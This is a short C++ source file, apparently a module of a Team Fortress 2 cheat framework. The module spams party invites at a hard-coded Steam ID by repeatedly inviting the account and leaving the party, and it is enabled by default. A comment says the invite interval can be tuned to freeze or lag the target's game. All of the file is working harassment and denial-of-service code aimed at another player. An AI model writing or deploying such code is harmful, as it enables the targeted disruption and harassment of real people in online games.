#include "common.hpp"

namespace hacks::invitespam
{

static settings::Boolean enabled("invitespam.enable", "true");
static settings::Int steamid("invitespam.target", "1300269797");
static settings::Int invtime{ "invitespam.invtime", "100" }; // Adjust this if you want to freeze or lag someone's game.

static Timer invtimer{};
static void Paint()
{
    if (!enabled)
        return;
    if (invtimer.test_and_set(*invtime))
    {
        g_IEngine->ClientCmd_Unrestricted(strfmt("tf_party_invite_user %i", *steamid).get());
        g_IEngine->ClientCmd_Unrestricted("tf_party_leave");
    }
}

static InitRoutine init([]() {
    EC::Register(EC::Paint, Paint, "paint_invitespam");
});

} // namespace hacks::invitespam
